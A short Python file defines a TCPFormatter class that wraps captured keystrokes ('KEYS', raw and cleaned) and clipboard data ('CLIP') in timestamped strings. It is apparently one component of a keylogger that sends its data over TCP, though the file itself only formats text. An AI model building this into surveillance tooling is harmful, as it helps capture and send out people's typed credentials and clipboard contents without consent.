from datetime import datetime
from .base import BaseFormatter

class TCPFormatter(BaseFormatter):
    def format_raw(self, raw: str, clean: str = "") -> str:
        return f"KEYS|{datetime.now().isoformat()}|\nRaw:{raw}|\nClean:{clean}"
    
    def format_clipboard(self, data: str) -> str:
        return f"CLIP|{datetime.now().isoformat()}|{data}"